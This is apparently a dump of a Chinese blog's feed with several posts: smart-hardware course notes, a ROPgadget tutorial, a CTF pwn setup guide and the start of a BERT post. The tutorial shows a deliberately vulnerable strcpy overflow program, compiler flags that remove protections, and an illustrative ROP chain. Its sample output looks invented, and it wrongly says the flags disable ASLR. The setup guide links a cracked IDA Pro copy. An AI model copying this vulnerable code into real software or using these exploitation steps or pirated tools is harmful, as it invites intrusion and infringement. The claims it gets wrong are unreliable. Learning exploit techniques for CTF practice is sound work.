EP小车(自研)综合应用</p><h2 id="信息系统与智能硬件"><a href="#信息系统与智能硬件" class="headerlink" title="信息系统与智能硬件"></a>信息系统与智能硬件</h2><h6 id="传统信息处理手段："><a href="#传统信息处理手段：" class="headerlink" title="传统信息处理手段："></a><strong>传统信息处理手段</strong>：</h6><p><strong>统计分析(Statistics)：</strong></p><p>最基础的处理技术，常用的包括描述性统计(均值、方差、中位数等)、回 归分析(线性回归、逻辑回归等)、假设分析(单样本t检验等)</p><p><strong>规则基础系统(Rule-BasedSystems)，专家系统：</strong></p><p>基于人类构建的规则，模拟专家决策的过程</p><p><strong>聚类分析(ClusteringAnalysis)：</strong></p><p>将数据分成若干个组或类别，使同一类别内的数据具有较高的相似性， 常用的包括K-means、层次聚类(HierarchicalClustering)等</p><p><strong>时间序列分析(TimeSeriesAnalysis)：</strong></p><p>分析按时间顺序排列的数据，常用的技术包括自回归(AR)、移动平均 (MA)、ARIMA模型等。</p><p><strong>处理数据才可获取信息</strong></p><h6 id="信息系统的结构："><a href="#信息系统的结构：" class="headerlink" title="信息系统的结构："></a>信息系统的结构：</h6><p>硬件和软件是信息系统的两个核心部分，各自作用不同，共同配 合实现信息系统的功能，<strong>硬件决定性能，软件定义功能</strong></p><p><strong>硬件：</strong></p><p>有实体存在的各类实体物理设备，硬件提供了获取信息、 保存信息、处理信息和执行决策的基础设施支撑，如：</p><p><strong>输入设备</strong>：将外部数据输入到信息系统</p><p><strong>处理设备</strong>：执行计算、逻辑运算和数据处理任务</p><p><strong>存储设备</strong>：临时存储或长期存储数据</p><p><strong>输出设备</strong>：信息系统处理后的结果呈现给用户</p><p><strong>通信设备</strong>：与其他系统或设备互联，进行远程访问或数据交换</p><p><strong>各类设备之间的界限可以是模糊的，功能可以是融合的</strong></p><p><strong>软件：</strong></p><p>没有实体存在的无形的功能，主要指系统中的程序和操作 系统，控制和协调硬件的操作，并对数据进行处理，如：</p><p><strong>操作系统</strong>：基础软件，负责硬件的管理和控制，提供用户与硬件的接口， 确保硬件和应用软件的正常运行</p><p><strong>应用软件</strong>：根据特定任务需求设计和开发特定功能的软件</p><p><strong>数据库管理系统</strong>：是用于创建、管理、存储和操作数据库的软件</p><p><strong>开发工具和编程语言</strong>：用来创建、测试和维护其他软件的工具</p><p><strong>安全软件</strong>：保护信息系统免受病毒、恶意软件、黑客攻击等安全威胁</p><p><strong>中间件</strong>：帮助不同应用或系统间进行数据交换、通信和协作</p><h6 id="智能硬件"><a href="#智能硬件" class="headerlink" title="智能硬件"></a><strong>智能硬件</strong></h6><p>**定义：**指集成计算、感知、通信和控制等 功能的硬件设备，通常具有一定的自我学习、适应、推理和决策 能力，通过与外部环境或用户的交互，执行预定或自主决策任务，智能硬件通常结合了硬件技术、传感器技术、人工智能和物联网 技术等，能够在一定程度上实现智能化的操作或自动化功能</p><p><strong>六大硬件组成：</strong></p><p>**输入&#x2F;感知：**感知外部&#x2F;内部状态，产生感知数据</p><p><strong>通信：</strong> 智能硬件之间或与外部系统的联网和数据通信</p><p>**存储：**保存操作系统、应用程序、数据和配置等内容</p><p>**计算：**进行运算和决策，控制智能硬件系统工作</p><p>**输出&#x2F;执行：**输出计算结果，控制外部设备等</p><p><strong>软件组成：</strong></p><p>**操作系统(OS)：**硬件抽象层、进程管理、内存管理、文件系统 等功能，执行多任务并提供更高效的资源管理</p><p>**固件(Firmware)：**直接与硬件进行交互，负责设备的初始化、硬 件控制和低级功能实现</p><p>**驱动(Drivers)：**对操作系统和上层应用屏蔽硬件之间的差异， 提供统一的控制和管理接口</p><p>**协议栈(Stack)：**与其他设备或云端通信所使用的协议栈，比包 括设备内部的，主要指网络通信和数据传输</p><p>**应用软件(APP)：**用户与智能硬件交互的主要软件部分。它通常 负责提供具体的功能，如数据处理等</p><h6 id="智能硬件系统的功能特性"><a href="#智能硬件系统的功能特性" class="headerlink" title="智能硬件系统的功能特性"></a>智能硬件系统的功能特性</h6><p><strong>功能完备性</strong>：感知、存储、通信、计算、输出</p><p>​<strong>系统角度</strong>：智能硬件系统必须要实现全部的功能，缺一不可</p><p><strong>结构灵活性</strong>：功能在系统中可拆分、可结合</p><p>​<strong>(1)某个功能可以在不同的部件上实现</strong></p><p>​ 计算：可以在CPU、协处理器、GPU、NPU、FPGA等部件上进行</p><p>​ 感知：可以通过芯片内部、外部独立传感器等部件实现</p><p>​ 输出：可以通过发声设备、显示设备、执行设备等部件实现输出</p><p>​<strong>(2)某个部件可以实现多个功能</strong></p><p>​ 某SoC芯片：内部集成了计算、存储功能，甚至可以执行通信功能</p><p>​ 触摸屏：集成了输入功能和输出功能</p><p>​ 前面介绍过的：震动游戏手柄、显卡等</p><p><strong>任务动态性</strong>：功能在系统中可以动态调整执行部件</p><p>​ <strong>(1)单一规则设定</strong>：同种类型的感知数据，产生不同的输出结果</p><p>​ <strong>(2)多源规则设定</strong>：多个来源的感知数据，产生不同的输出结果</p><p>​<strong>(3)外界控制设定</strong>：同种类型的感知数据，可以被不同的部件处理和输出</p><p><strong>系统扩展性</strong>：设备可以加入其他系统，或被其他设备加入</p><p>​<strong>(1)设备扩展性</strong>：向现有系统中增加新硬件设备，进行系统扩展</p><p>​功能：扩展系统的功能，如增加湿度感知功能、增加机械手实现抓取功能等</p><p>​性能：提升系统的性能，如增加新摄像头提升图像分辨率等</p><p>​范围：扩大系统的覆盖范围，如在新环境中增加温湿度感知设备等</p><p>​<strong>(2)功能扩展性</strong>：向现有系统中增加新软件实现，进行系统扩展</p><p>​功能：新增加的硬件设备，必须通过软件实现相关的功能</p><p>​性能：通过软件控制方法或算法提升系统的性能</p><p>​输出：通过软件方法设置新的人机交互方式和输出模式、作业类型</p><p><strong>短板制约性</strong>：软硬件必须协调工作，才能达到系统最佳性能</p><h6 id="第一节课课后习题："><a href="#第一节课课后习题：" class="headerlink" title="第一节课课后习题："></a><strong>第一节课课后习题：</strong></h6><ol><li>信息时代的主要特征有哪些 </li><li>信息的主要特征有哪些 </li><li>AI的关键技术有哪些 </li><li>信息系统主要由哪五大类硬件构成，举例说明具体的设备类型 </li><li>信息系统主要由哪六大类软件系统构成 </li><li>智能硬件主要由哪六大类硬件构成，各自作用是什么</li><li>智能硬件主要由哪五大类软件构成，为何与常规信息系统不同 </li><li>思考：用一种你觉得合理的方式，将智能硬件的硬件部分和软 件部分结合表达在一幅图中</li></ol><h2 id="智能硬件的处理单元"><a href="#智能硬件的处理单元" class="headerlink" title="智能硬件的处理单元"></a>智能硬件的处理单元</h2><h5 id="智能硬件的软硬件关系图"><a href="#智能硬件的软硬件关系图" class="headerlink" title="智能硬件的软硬件关系图"></a>智能硬件的软硬件关系图</h5><p><img src="/../00000000/image-20250326103722003.png" alt="image-20250326103722003"></p><h5 id="常规信息处理部件"><a href="#常规信息处理部件" class="headerlink" title="常规信息处理部件"></a>常规信息处理部件</h5><p><strong>CPU(中央处理单元，CentralProcessingUnit)的主要指标：</strong></p><p><img src="/./../00000000/image-20250326103914101.png" alt="image-20250326103914101"></p><p><strong>台式机和服务器上的CPU普遍以性能为主，使用市电供电，不关心CPU功率</strong></p><p><strong>GPU(图形处理单元，GraphicsProcessingUnit)的主要指标：</strong></p><p><img src="/./../00000000/image-20250326104016074.png" alt="image-20250326104016074"></p><p><strong>图形工作站和服务器上的GPU以性能为主，使用市电供电，不关心GPU功率</strong></p><h5 id="CPU和GPU的共同特点"><a href="#CPU和GPU的共同特点" class="headerlink" title="CPU和GPU的共同特点"></a>CPU和GPU的共同特点</h5><p><strong>性能高：</strong></p><p>​<strong>多核</strong>：CPU一般8核或更高， GPU一般上千核或更高</p><p>​<strong>复杂</strong>：丰富的指令集和结构</p><p><strong>功耗高：</strong></p><p>​<strong>单处理器功耗</strong>：几十W或更高</p><p><strong>体积大：</strong></p><p>​<strong>处理器面积</strong>：数百mm2或更高</p><p><strong>外围电路复杂</strong>：</p><p>​大容量存储、大功率电源等</p><p>**优势：**为系统提供强大的运算处理能力</p><p>**在小型智能硬件上的劣势：**性能过剩 功耗过高 体积过大 系统复杂</p><p>其中的小型智能硬件指的是：无需处理复杂数据 小电源或电池供电 附着在其他物品上 结构简单可靠性高</p><p><strong>CPU和GPU很好，只是不合适</strong></p><h5 id="小型智能硬件的计算需求："><a href="#小型智能硬件的计算需求：" class="headerlink" title="小型智能硬件的计算需求："></a>小型智能硬件的计算需求：</h5><p><img src="/../00000000/image-20250326105232368.png" alt="image-20250326105232368"></p><h5 id="智能硬件常用的计算部件："><a href="#智能硬件常用的计算部件：" class="headerlink" title="智能硬件常用的计算部件："></a>智能硬件常用的计算部件：</h5><p>两类智能硬件常用的计算部件：MCU和SoC</p><p><strong>MCU(MicrocontrollerUnit)</strong>：一种小型的单片计算机，通常用于嵌入式系 统中，集成了处理器核心(CPU)、内存、外设接口以及基本的外设模块</p><p>​     MCU用于执行简单的控制和计算任务，适合用于低功耗、低成本和小规 模功能的应用</p><p><strong>SoC(SystemonChip)</strong>：一种将整个系统的多个功能集成到单个芯片上的 技术。SoC不仅包含一个或多个CPU核心，还可以集成图形处理单元 (GPU)、通信模块 (Wi-Fi、蓝牙、LTE等)、存储单元、音频、视频处理单 元，甚至是AI加速器等。</p><pre><code class="hljs">SoC适用于需要高性能和多功能的复杂系统，如智能手机、平板电脑、 智能电视、智能家居的核心设备等</code></pre><p><strong>外观上都是芯片：</strong></p><p><img src="/../00000000/image-20250326105444042.png" alt="image-20250326105444042"></p><h5 id="计算部件性能对比："><a href="#计算部件性能对比：" class="headerlink" title="计算部件性能对比："></a>计算部件性能对比：</h5><p><img src="/./../00000000/image-20250326105538291.png" alt="image-20250326105538291"></p><p><img src="/./../00000000/image-20250326105708909.png" alt="image-20250326105708909"></p><p><strong>红色方框内的区域一般也认为是Soc和MCU的一种区别观点</strong></p><h5 id="常用的MCU"><a href="#常用的MCU" class="headerlink" title="常用的MCU"></a><strong>常用的MCU</strong></h5><h6 id="常用的8位的MCU："><a href="#常用的8位的MCU：" class="headerlink" title="常用的8位的MCU："></a>常用的8位的MCU：</h6><p><strong>特点</strong>：8位位宽、KB级别存储，较少内部功能模块</p><p><strong>常见的8位MCU</strong>：主频不超过20MHz，多周期12T</p><p>​<strong>8051架构</strong>：最经典的8位MCU，128BRAM、4KBROM</p><p>​<strong>PIC系列</strong>：Microchip公司(已被收购)</p><p>​<strong>AVR系列</strong>：ATMEL公司，<strong>仅存的广泛使用的八位MCU</strong></p><p><strong>传统的8051等8位MCU运行速度低、指令效率低，内部功能模块少，且功耗偏高 基本内部功能模块：定时器、串行通信、中断和ISP等，支持标压5V或低压3.3V运行</strong></p><p>​<img src="/./../00000000/image-20250326111032257.png" alt="image-20250326111032257"></p><p><strong>8位MCU一般应用在非智能型的设备控制领域，小家电领域(电磁炉、微波炉等)</strong></p><h6 id="常用的16位的MCU："><a href="#常用的16位的MCU：" class="headerlink" title="常用的16位的MCU："></a>常用的16位的MCU：</h6><p><strong>特点</strong>：除性能提升之外，更丰富的外设功能</p><p><strong>常见的16位MCU</strong>：主频一般不超过100MHz</p><p><img src="/./../00000000/image-20250326111303702.png" alt="image-20250326111303702"></p><p><strong>16位MCU运行速度提升，指令效率大幅提升，广泛使用3.3V工作电压，集成更多功能模块 16位MCU主要应用在一些电池供电设备、有控制算法需求的家电(洗衣机、空调等)</strong></p><h6 id="常用的32位的MCU"><a href="#常用的32位的MCU" class="headerlink" title="常用的32位的MCU"></a>常用的32位的MCU</h6><p><strong>特点</strong>：性能强大、外设全面，SoC趋势</p><p><strong>主流内核一</strong>：ARM Cortex-M内核</p><p><img src="/./../00000000/image-20250326111421278.png" alt="image-20250326111421278"></p><p> PIC32系列MCU、NXP LPC系列MCU：略</p><p><strong>主流内核二</strong>：RISC-V内核</p><p><img src="/./../00000000/image-20250326111501461.png" alt="image-20250326111501461"></p><p><strong>兆易创新(Gigadevice)与芯来科技(Nuclei System Technology) 面向物联网及其它超低功耗场景应用自主联合开发的一款商用RISC-V处理器</strong></p><p><img src="/./../00000000/image-20250326111633789.png" alt="image-20250326111633789"></p><p><strong>内核三</strong>：TensilicaXtensa内核</p><p><img src="/./../00000000/image-20250326111812519.png" alt="image-20250326111812519"></p><p>乐鑫公司(Espressif)的产品更多带有Wi-Fi、BT等无线通信功能，课程将其归类为SoC</p><h5 id="常用的SoC"><a href="#常用的SoC" class="headerlink" title="常用的SoC:"></a>常用的SoC:</h5><p><img src="/./../00000000/image-20250326112045016.png" alt="image-20250326112045016"></p><p><img src="/./../00000000/image-20250326112146105.png" alt="image-20250326112146105"></p><p><img src="/./../00000000/image-20250326112213228.png" alt="image-20250326112213228"></p><h6 id="星闪SoC-WS63的结构"><a href="#星闪SoC-WS63的结构" class="headerlink" title="星闪SoC WS63的结构"></a><strong>星闪SoC WS63的结构</strong></h6><p><img src="/./../00000000/image-20250326112245396.png" alt="image-20250326112245396"></p><p>**总线：**数据总线 + 地址总线 + 控制总线</p><h6 id="AMBA-总线形式"><a href="#AMBA-总线形式" class="headerlink" title="AMBA 总线形式"></a>AMBA 总线形式</h6><p><img src="/./../00000000/image-20250326112729381.png" alt="image-20250326112729381"></p><p><strong>question：</strong> GPIO等外设如何被CPU访问和控制？</p><h6 id="是否SoC的所有部件都需要高速总线："><a href="#是否SoC的所有部件都需要高速总线：" class="headerlink" title="是否SoC的所有部件都需要高速总线："></a>是否SoC的所有部件都需要高速总线：</h6><p><img src="/./../00000000/image-20250327171708821.png" alt="image-20250327171708821"></p><h6 id="高速低速转换的bridge："><a href="#高速低速转换的bridge：" class="headerlink" title="高速低速转换的bridge："></a>高速低速转换的bridge：</h6><p><img src="/./../00000000/image-20250327171725411.png" alt="image-20250327171725411"></p><h6 id="SoC的各种硬件功能单元："><a href="#SoC的各种硬件功能单元：" class="headerlink" title="SoC的各种硬件功能单元："></a>SoC的各种硬件功能单元：</h6><p><img src="/./../00000000/image-20250327172127331.png" alt="image-20250327172127331"></p><h6 id="沟通软件硬件的桥梁"><a href="#沟通软件硬件的桥梁" class="headerlink" title="沟通软件硬件的桥梁"></a>沟通软件硬件的桥梁</h6><p><img src="/./../00000000/image-20250327172340965.png" alt="image-20250327172340965"></p><p><strong>沟通软件硬件的桥梁是一段代码</strong></p><p>范例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> PD4 (*((volatileunsignedint*)0x40011404))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PB5 (*((volatileunsignedint*)0x40010C08))</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-keyword">if</span>(PD4==<span class="hljs-number">1</span>)&#123;<br> &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">volatile：变量易变化，编译器不要优化，每次都需要重新读取</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">(unsignedint*)：32位长度无符号型的指针，相当于p</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">define PD4 *p</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">PD4为p指针指向的位置的内容，访问了特定内存地址的数据</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">后续<span class="hljs-keyword">if</span>语句就是我们要做的事</span><br></code></pre></td></tr></table></figure><p><img src="/./../00000000/image-20250327172703874.png" alt="image-20250327172703874"></p><p><strong>特定的内存地址通过硬件电路 与外设模块建立关联(不详述)</strong></p><p> <strong>SoC与硬件有关联功能的特定的内存地址 特殊功能寄存器(SpecialFunctionRegister)</strong></p>]]></content>
    
    
    <categories>
      
      <category>大连理工大学学习</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ROPgadget</title>
    <link href="/ROPgadget/"/>
    <url>/ROPgadget/</url>
    
    <content type="html"><![CDATA[<p>使用 <code>ROPgadget</code> 自动生成 ROP 链是一个非常实用的功能，尤其是在进行漏洞利用开发时。以下是一个详细的指南，介绍如何使用 <code>ROPgadget</code> 自动生成 ROP 链，并结合一个简单的示例来展示其用法。</p><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><ol><li><p><strong>安装 ROPgadget</strong>：确保你已经安装了 ROPgadget。可以通过以下命令安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt install python3-pip<br><span class="hljs-built_in">sudo</span> -H python3 -m pip install ROPgadget<br></code></pre></td></tr></table></figure></li><li><p><strong>准备目标二进制文件</strong>：确保你有一个目标二进制文件，该文件包含可利用的漏洞。</p></li></ol><h3 id="示例程序"><a href="#示例程序" class="headerlink" title="示例程序"></a>示例程序</h3><p>假设我们有一个简单的 C 程序 <code>example.c</code>，代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">vuln_function</span><span class="hljs-params">(<span class="hljs-type">char</span> *input)</span> &#123;<br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">64</span>];<br>    <span class="hljs-built_in">strcpy</span>(buffer, input);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span> &#123;<br>    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">2</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Usage: %s &lt;input&gt;\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    vuln_function(argv[<span class="hljs-number">1</span>]);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个程序存在一个经典的缓冲区溢出漏洞，因为 <code>strcpy</code> 函数没有检查目标缓冲区的大小。</p><h3 id="编译程序"><a href="#编译程序" class="headerlink" title="编译程序"></a>编译程序</h3><p>将上述代码编译为一个可执行文件，关闭堆叠保护和地址空间布局随机化（ASLR）以便于分析：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -fno-stack-protector -z execstack -o example example.c<br></code></pre></td></tr></table></figure><h3 id="使用-ROPgadget-自动生成-ROP-链"><a href="#使用-ROPgadget-自动生成-ROP-链" class="headerlink" title="使用 ROPgadget 自动生成 ROP 链"></a>使用 ROPgadget 自动生成 ROP 链</h3><ol><li><p><strong>查找 gadgets</strong>：<br>首先，使用 ROPgadget 查看二进制文件中的 gadgets：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ROPgadget --binary example<br></code></pre></td></tr></table></figure><p>输出可能如下：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">[...]<br><span class="hljs-number">0x0000000000401016</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdi</span> <span class="hljs-comment">; ret</span><br><span class="hljs-number">0x0000000000401018</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rsi</span> <span class="hljs-comment">; pop r15 ; ret</span><br><span class="hljs-number">0x000000000040101b</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdx</span> <span class="hljs-comment">; ret</span><br><span class="hljs-number">0x000000000040101d</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rax</span> <span class="hljs-comment">; ret</span><br><span class="hljs-number">0x000000000040101f</span> : <span class="hljs-keyword">syscall</span><br>[...]<br></code></pre></td></tr></table></figure></li><li><p><strong>自动生成 ROP 链</strong>：<br>接下来，使用 ROPgadget 自动生成 ROP 链：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ROPgadget --binary example --ropchain<br></code></pre></td></tr></table></figure><p>输出可能如下：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">[+] Generating ROP chain<br>[...]<br><span class="hljs-number">0x0000000000401016</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdi</span> <span class="hljs-comment">; ret</span><br><span class="hljs-number">0x0000000000601060</span> : <span class="hljs-number">0xdeadbeef</span><br><span class="hljs-number">0x000000000040101b</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdx</span> <span class="hljs-comment">; ret</span><br><span class="hljs-number">0x0000000000601068</span> : <span class="hljs-number">0xfeedface</span><br><span class="hljs-number">0x000000000040101d</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rax</span> <span class="hljs-comment">; ret</span><br><span class="hljs-number">0x0000000000601070</span> : <span class="hljs-number">0x1</span><br><span class="hljs-number">0x000000000040101f</span> : <span class="hljs-keyword">syscall</span><br>[...]<br></code></pre></td></tr></table></figure></li></ol><h3 id="分析生成的-ROP-链"><a href="#分析生成的-ROP-链" class="headerlink" title="分析生成的 ROP 链"></a>分析生成的 ROP 链</h3><p>生成的 ROP 链通常包含以下内容：</p><ol><li><strong>设置寄存器值</strong>：通过 <code>pop</code> 指令将特定值加载到寄存器中。</li><li><strong>调用目标函数</strong>：例如调用 <code>syscall</code> 或其他函数。</li></ol><h3 id="手动调整-ROP-链"><a href="#手动调整-ROP-链" class="headerlink" title="手动调整 ROP 链"></a>手动调整 ROP 链</h3><p>自动生成的 ROP 链可能需要根据具体需求进行调整。例如：</p><ul><li>如果我们希望调用 <code>puts</code> 函数来打印某个地址的内容，可以手动调整 ROP 链。</li><li>假设 <code>puts</code> 函数的地址是 <code>0x0000000000401040</code>，目标地址是 <code>0x0000000000601060</code>，可以手动构造如下 ROP 链：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">0x0000000000401016 : pop rdi ; ret<br>0x0000000000601060 : address of target string<br>0x0000000000401040 : address of puts function<br>0x0000000000401000 : address of exit function (optional)<br></code></pre></td></tr></table></figure></li></ul><h3 id="测试-ROP-链"><a href="#测试-ROP-链" class="headerlink" title="测试 ROP 链"></a>测试 ROP 链</h3><p>将调整后的 ROP 链转换为字节序列，通过输入传递给程序，然后使用调试工具（如 GDB）观察执行结果。</p><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ol><li><strong>确保目标二进制文件未启用 ASLR</strong>：在测试时，关闭 ASLR 可以简化调试过程。</li><li><strong>验证 gadgets 的有效性</strong>：确保生成的 gadgets 在目标环境中有效。</li><li><strong>调试和测试</strong>：使用 GDB 等调试工具验证 ROP 链的执行效果。</li></ol><p>通过以上步骤，你可以使用 <code>ROPgadget</code> 自动生成并调整 ROP 链，从而提高漏洞利用的效率。</p>]]></content>
    
    
    <categories>
      
      <category>CTF_PWN</category>
      
      <category>环境配置</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CTF_PWN环境配置指南</title>
    <link href="/CTF_PWN%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E6%8C%87%E5%8D%97/"/>
    <url>/CTF_PWN%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E6%8C%87%E5%8D%97/</url>
    
    <content type="html"><![CDATA[<h1 id="CTF-PWN环境配置指南"><a href="#CTF-PWN环境配置指南" class="headerlink" title="CTF_PWN环境配置指南"></a>CTF_PWN环境配置指南</h1><h3 id="pwndbg-pwngdb"><a href="#pwndbg-pwngdb" class="headerlink" title="pwndbg[pwngdb]:"></a>pwndbg[pwngdb]:</h3><p>这里我比较推荐安装pwndbg，我最开始使用的pwngdb，但是它的细节我个人觉得没有pwndbg的好。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone https://github.com/pwndbg/pwndbg<br>cd pwndbg<br>./setup.sh<br></code></pre></td></tr></table></figure><p>然后我们可以查看.gdbinit中的内容</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat .gdbinit<br></code></pre></td></tr></table></figure><p>如果你之前没有安装过别的插件，应该就只有</p><p><img src="/../00000000/image-20250320105153106.png" alt="image-20250320105153106"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">source /home/zino/pwndbg/gdbinit.py<br></code></pre></td></tr></table></figure><p>如果安装过，将前面的注释掉就行，使用也比较简单，自己去网上搜索教程学习即可</p><h3 id="IDA-Pro"><a href="#IDA-Pro" class="headerlink" title="IDA_Pro:"></a>IDA_Pro:</h3><p>没有找到之前别人开源的链接，我就自己传了一个</p><p><a href="https://github.com/briteny-pwn/IDA_Pro_files">https://github.com/briteny-pwn/IDA_Pro_files</a></p><p>为防止有新手不熟GitHub，详细介绍下载到本地的操作</p><p>1.打开仓库界面，其实就是我上面给的链接</p><p>2.点击右上角的 ‘code’ 按键</p><p>3.在下拉菜单中可以找到一个Download ZIP的选项，点击下载</p><p>4.在本地解压缩包即可</p><p><strong>5.在使用IDA之前可以在文件夹里面找到一个绿化工具，点击运行后IDA即可正常使用</strong></p><p>具体使用方法在此不多赘述</p><h3 id="ROPgadget："><a href="#ROPgadget：" class="headerlink" title="ROPgadget："></a>ROPgadget：</h3><p>在配置好相关环境[ 如python3，python-capstone等 ]后直接在shell中输入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">hacker$</span><span class="language-bash">: <span class="hljs-built_in">sudo</span> pip3 install ROPgadget</span><br></code></pre></td></tr></table></figure><p>你可能会遇到报错：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">error: externally-mangaged-environment<br></code></pre></td></tr></table></figure><p>这个时候通常我们采用两种解决方法</p><p><strong>1.创建虚拟环境，并激活</strong></p><p>创建：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python3 -m venv myenv<br></code></pre></td></tr></table></figure><p>激活：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">source myenv/bin/activate<br></code></pre></td></tr></table></figure><p>随后在虚拟环境中再输入上面的命令即可</p><p><strong>2.当然你也可以无视风险</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo pip install ROPgadget --break-system-packages<br></code></pre></td></tr></table></figure><p>这种方法可能会破坏系统环境，导致系统不稳定或出现其他问题，因此不推荐使用[ 但是我初学的时候就是用的这个方法安装的 ]</p>]]></content>
    
    
    <categories>
      
      <category>CTF_PWN</category>
      
      <category>环境配置</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>人工智能模型学习——BERT</title>
    <link href="/BERT_model/"/>
    <url>/BERT_model/</url>
    
